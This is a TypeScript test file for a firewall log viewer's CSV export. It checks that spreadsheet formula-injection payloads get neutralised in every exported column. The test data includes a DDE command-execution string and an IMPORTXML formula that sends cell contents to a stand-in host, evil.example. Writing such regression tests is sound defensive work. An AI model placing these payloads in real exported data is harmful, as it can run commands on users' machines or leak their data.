// SPDX-License-Identifier: AGPL-3.0-only

import { describe, expect, it } from 'vitest'
import type { FirewallEvent } from './types'
import { COLUMNS, eventsToCsv } from './export'

function event(overrides: Partial<FirewallEvent> = {}): FirewallEvent {
  return {
    id: 1,
    time: '2026-08-07T10:00:00Z',
    deviceId: 'router',
    sourceIp: '192.0.2.1',
    action: 'drop',
    raw: 'a plain line',
    ...overrides,
  } as FirewallEvent
}

function cells(csv: string, row = 1): string[] {
  return csv.split('\n')[row].split(',')
}

describe('CSV export formula injection', () => {
  // Every one of these reaches the export from outside mikroview: `raw`
  // is the syslog line verbatim, `ruleLabel` is router configuration,
  // the hostname columns come from naming/DNS.
  it.each([
    ['=cmd|\' /C calc\'!A0', 'DDE command execution'],
    ['=IMPORTXML("http://evil.example/?d="&A1,"//a")', 'silent exfiltration of adjacent cells'],
    ['@SUM(1+1)', 'legacy Lotus-style formula lead'],
    ['+1+1', 'plus lead'],
    ['-1+1', 'minus lead'],
    ['\t=1+1', 'tab then formula -- leading whitespace is stripped first'],
    ['\r=1+1', 'CR then formula'],
  ])('neutralises %j (%s)', (payload) => {
    const csv = eventsToCsv([event({ raw: payload })])
    // The cell must no longer begin with a formula character. Checked on
    // the raw text rather than a parsed cell, since what matters is what
    // the spreadsheet sees before it parses anything.
    const body = csv.split('\n').slice(1).join('\n')
    const cellStart = body.indexOf(payload.trimStart()[0])
    expect(body[cellStart - 1] === "'" || body.includes(`'${payload}`)).toBe(true)
    expect(body.startsWith('=')).toBe(false)
  })

  it('leaves ordinary values untouched', () => {
    const csv = eventsToCsv([event({ deviceId: 'router', action: 'drop' })])
    expect(cells(csv)[1]).toBe('router')
    expect(cells(csv)[3]).toBe('drop')
  })

  // Quoting alone was the old behaviour and is not a defence -- the
  // spreadsheet unquotes before deciding whether a cell is a formula.
  it('neutralises a payload that also needs CSV quoting', () => {
    const csv = eventsToCsv([event({ raw: '=HYPERLINK("http://evil.example","click"),x' })])
    expect(csv).toContain('"\'=HYPERLINK')
  })
})

// The tests above cover the columns that exist today. This one covers
// the ones that don't yet: it drives every entry in COLUMNS, so adding
// a column without routing it through csvEscape fails here rather than
// in someone's spreadsheet. A new column is exactly how this defect
// comes back.
describe('every exported column is neutralised', () => {
  // Deliberately free of quotes and commas, so csvEscape's quoting
  // branch doesn't fire and the assertions can look at the cell text
  // directly. The quoting-plus-neutralising interaction is covered
  // separately above.
  const PAYLOAD = '=IMPORTXML(A1)'

  it.each(COLUMNS)('column %s', (column) => {
    const csv = eventsToCsv([event({ [column]: PAYLOAD } as Partial<FirewallEvent>)])
    const body = csv.split('\n').slice(1).join('\n')

    expect(body).toContain(`'${PAYLOAD}`) // exported, behind the neutralising prefix
    expect(body).not.toContain(`,${PAYLOAD}`) // never a bare cell mid-row
    expect(body.startsWith(PAYLOAD)).toBe(false) // nor the first cell
  })

  it('covers a non-trivial number of columns', () => {
    // Guards against COLUMNS being emptied or renamed out from under
    // the it.each above, which would make it vacuously pass.
    expect(COLUMNS.length).toBeGreaterThan(20)
  })
})
